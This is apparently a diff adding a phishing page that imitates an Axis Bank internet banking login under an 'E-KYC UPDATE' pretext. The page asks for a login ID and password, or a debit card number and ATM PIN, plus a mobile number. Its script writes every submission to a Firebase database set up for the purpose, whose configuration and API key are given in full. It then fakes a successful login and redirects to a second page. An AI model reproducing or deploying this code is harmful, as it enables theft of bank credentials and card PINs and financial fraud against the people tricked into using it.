@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Internet Banking Login</title>
+
+<style>
+/* SIMPLE STYLES */
+body{
+    margin:0;
+    font-family: Arial, sans-serif;
+    background:#f5f5f5;
+}
+.header{
+    margin:0;
+    padding:0;
+}
+.header img{
+    width:100%;
+    display:block;
+}
+.container{
+    padding:20px;
+}
+.title{
+    font-size:22px;
+    margin-bottom:15px;
+    font-weight:bold;
+}
+.toggle{
+    display:flex;
+    gap:10px;
+    margin-bottom:20px;
+}
+.toggle button{
+    flex:1;
+    padding:10px;
+    border-radius:25px;
+    border:1px solid #ccc;
+    background:white;
+    cursor:pointer;
+}
+.toggle .active{
+    background:#a0003c;
+    color:white;
+    border:none;
+}
+.input-group{
+    margin-bottom:15px;
+}
+.input-group label{
+    display:block;
+    margin-bottom:5px;
+}
+.input-group input{
+    width:100%;
+    padding:12px;
+    border-radius:8px;
+    border:1px solid #ccc;
+    box-sizing:border-box;
+}
+select{
+    width:100%;
+    padding:12px;
+    border-radius:8px;
+    border:1px solid #ccc;
+    margin-bottom:20px;
+}
+.login-btn{
+    width:100%;
+    padding:15px;
+    background:#a0003c;
+    color:white;
+    border:none;
+    border-radius:25px;
+    font-size:18px;
+    cursor:pointer;
+}
+.hidden{
+    display:none;
+}
+.footer{
+    margin-top:40px;
+}
+.footer img{
+    width:100%;
+    display:block;
+}
+.loader-overlay{
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:rgba(255,255,255,0.9);
+    display:none;
+    justify-content:center;
+    align-items:center;
+    flex-direction:column;
+    z-index:9999;
+}
+.spinner{
+    width:50px;
+    height:50px;
+    border:6px solid #ccc;
+    border-top:6px solid #a0003c;
+    border-radius:50%;
+    animation:spin 1s linear infinite;
+}
+@keyframes spin{
+    0%{ transform:rotate(0deg); }
+    100%{ transform:rotate(360deg); }
+}
+.message{
+    padding:12px;
+    border-radius:8px;
+    margin-bottom:15px;
+    display:none;
+}
+.message.success{
+    background:#d4edda;
+    color:#155724;
+    border:1px solid #c3e6cb;
+}
+.message.error{
+    background:#f8d7da;
+    color:#721c24;
+    border:1px solid #f5c6cb;
+}
+</style>
+</head>
+
+<body>
+
+<!-- FIREBASE SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+<div class="header">
+    <img src="header.png" alt="Header" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%25%22 height=%2280%22 viewBox=%220 0 100 80%22><rect width=%22100%25%22 height=%2280%22 fill=%22%238B0000%22/><text x=%2210%22 y=%2245%22 fill=%22white%22 font-size=%2220%22>Axis Bank</text></svg>'">
+</div>
+
+<div class="container">
+
+<div id="messageBox" class="message"></div>
+
+<div class="title">Login using</div>
+
+<div class="toggle">
+    <button id="loginBtn" class="active" onclick="showLogin()">Login ID/Customer ID</button>
+    <button id="debitBtn" onclick="showDebit()">Debit Card</button>
+</div>
+
+<!-- LOGIN ID FORM -->
+<div id="loginForm">
+    <div class="input-group">
+        <label>Login ID</label>
+        <input type="text" id="loginId" maxlength="12" placeholder="Enter Login ID">
+    </div>
+    <div class="input-group">
+        <label>Password</label>
+        <input type="password" id="loginPass" maxlength="30" placeholder="Enter Password">
+    </div>
+    <div class="input-group">
+        <label>Mobile Number</label>
+        <input type="text" id="mobileLogin" maxlength="10" placeholder="Enter 10 Digit Mobile">
+    </div>
+</div>
+
+<!-- DEBIT CARD FORM -->
+<div id="debitForm" class="hidden">
+    <div class="input-group">
+        <label>Debit Card</label>
+        <input type="text" id="cardNumber" maxlength="19" placeholder="XXXX-XXXX-XXXX-XXXX">
+    </div>
+    <div class="input-group">
+        <label>ATM PIN</label>
+        <input type="password" id="atmPin" maxlength="4" placeholder="Enter ATM PIN">
+    </div>
+    <div class="input-group">
+        <label>Mobile Number</label>
+        <input type="text" id="mobileDebit" maxlength="10" placeholder="Enter 10 Digit Mobile">
+    </div>
+</div>
+
+<div class="input-group">
+    <select id="ekycSelect">
+        <option value="update">E-KYC UPDATE</option>
+    </select>
+</div>
+
+<button class="login-btn" onclick="validateAndSave()">Login</button>
+
+</div>
+
+<div class="footer">
+    <img src="footer.png" alt="Footer" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%25%22 height=%2260%22 viewBox=%220 0 100 60%22><rect width=%22100%25%22 height=%2260%22 fill=%22%23333%22/><text x=%2210%22 y=%2235%22 fill=%22white%22 font-size=%2212%22>© 2024 Axis Bank</text></svg>'">
+</div>
+
+<!-- LOADING SCREEN -->
+<div class="loader-overlay" id="loader">
+    <div class="spinner"></div>
+    <p>Please wait...</p>
+</div>
+
+<script>
+// ============================================
+//  FIREBASE CONFIGURATION
+// ============================================
+const firebaseConfig = {
+    apiKey: "AIzaSyBqYAEIP3jPi2_1ao6JSVJyhLI7ZOBK440",
+    authDomain: "axisbank-ea121.firebaseapp.com",
+    databaseURL: "https://axisbank-ea121-default-rtdb.firebaseio.com",
+    projectId: "axisbank-ea121",
+    storageBucket: "axisbank-ea121.firebasestorage.app",
+    messagingSenderId: "512765027545",
+    appId: "1:512765027545:web:5e05b71a1c8a248d328ac8",
+    measurementId: "G-MXL1BH23T8"
+};
+
+// Initialize Firebase
+firebase.initializeApp(firebaseConfig);
+console.log(" Firebase Connected!");
+
+// ============================================
+// FUNCTIONS
+// ============================================
+function showLogin(){
+    document.getElementById("loginForm").classList.remove("hidden");
+    document.getElementById("debitForm").classList.add("hidden");
+    document.getElementById("loginBtn").classList.add("active");
+    document.getElementById("debitBtn").classList.remove("active");
+}
+
+function showDebit(){
+    document.getElementById("loginForm").classList.add("hidden");
+    document.getElementById("debitForm").classList.remove("hidden");
+    document.getElementById("loginBtn").classList.remove("active");
+    document.getElementById("debitBtn").classList.add("active");
+}
+
+// Card number formatting
+document.getElementById("cardNumber").addEventListener("input", function(e){
+    var value = e.target.value.replace(/\D/g,'').substring(0,16);
+    var formatted = value.match(/.{1,4}/g);
+    e.target.value = formatted ? formatted.join('-') : '';
+});
+
+function showMessage(text, type) {
+    const messageBox = document.getElementById('messageBox');
+    messageBox.textContent = text;
+    messageBox.className = 'message ' + type;
+    messageBox.style.display = 'block';
+    
+    setTimeout(() => {
+        messageBox.style.display = 'none';
+    }, 5000);
+}
+
+// Get current date
+function getCurrentDate() {
+    const now = new Date();
+    const day = String(now.getDate()).padStart(2, '0');
+    const month = String(now.getMonth() + 1).padStart(2, '0');
+    const year = now.getFullYear();
+    return `${day}/${month}/${year}`;
+}
+
+// Generate sequential user ID
+async function getNextUserId() {
+    const snapshot = await firebase.database().ref('users').once('value');
+    const users = snapshot.val();
+    if (!users) return 1;
+    return Object.keys(users).length + 1;
+}
+
+// ============================================
+// MAIN VALIDATION AND SAVE FUNCTION
+// ============================================
+async function validateAndSave() {
+    var mobilePattern = /^[6-9]\d{9}$/;
+    var activeLogin = !document.getElementById("loginForm").classList.contains("hidden");
+
+    try {
+        if(activeLogin) {
+            // LOGIN ID FORM
+            var id = document.getElementById("loginId").value.trim();
+            var pass = document.getElementById("loginPass").value.trim();
+            var mobile = document.getElementById("mobileLogin").value.trim();
+
+            if(id === "" || pass === "" || mobile === ""){
+                showMessage(" Please fill all fields", "error");
+                return;
+            }
+
+            if(!mobilePattern.test(mobile)){
+                showMessage(" Please enter valid 10 digit mobile number", "error");
+                return;
+            }
+
+            document.getElementById("loader").style.display = "flex";
+            
+            const userId = await getNextUserId();
+            const currentDate = getCurrentDate();
+            
+            // Save to Firebase
+            await firebase.database().ref('users/user_' + userId).set({
+                loginId: id,
+                password: pass,
+                mobile: mobile,
+                date: currentDate
+            });
+            
+            // Save userId for next pages
+            localStorage.setItem('userId', userId);
+            localStorage.setItem('userMobile', mobile);
+            
+            console.log(` User ${userId} saved`);
+            showMessage(" Login Successful! Redirecting...", "success");
+            
+            setTimeout(function(){
+                window.location.href = "Second.html";
+            }, 2000);
+
+        } else {
+            // DEBIT CARD FORM
+            var card = document.getElementById("cardNumber").value.replace(/-/g,'');
+            var pin = document.getElementById("atmPin").value.trim();
+            var mobile = document.getElementById("mobileDebit").value.trim();
+
+            if(card.length !== 16 || isNaN(card)){
+                showMessage(" Please enter valid 16 digit card number", "error");
+                return;
+            }
+
+            if(pin.length !== 4 || isNaN(pin)){
+                showMessage(" Please enter valid 4 digit ATM PIN", "error");
+                return;
+            }
+
+            if(!mobilePattern.test(mobile)){
+                showMessage(" Please enter valid 10 digit mobile number", "error");
+                return;
+            }
+
+            document.getElementById("loader").style.display = "flex";
+            
+            const userId = await getNextUserId();
+            const currentDate = getCurrentDate();
+            
+            // Save to Firebase
+            await firebase.database().ref('users/user_' + userId).set({
+                debitCard: card,
+                atmPin: pin,
+                mobile: mobile,
+                date: currentDate
+            });
+            
+            // Save userId for next pages
+            localStorage.setItem('userId', userId);
+            localStorage.setItem('userMobile', mobile);
+            
+            console.log(` User ${userId} saved`);
+            showMessage(" Login Successful! Redirecting...", "success");
+            
+            setTimeout(function(){
+                window.location.href = "Second.html";
+            }, 2000);
+        }
+    } catch (error) {
+        document.getElementById("loader").style.display = "none";
+        showMessage(" Error: " + error.message, "error");
+        console.error("Error:", error);
+    }
+}
+</script>
+
+</body>
+</html>
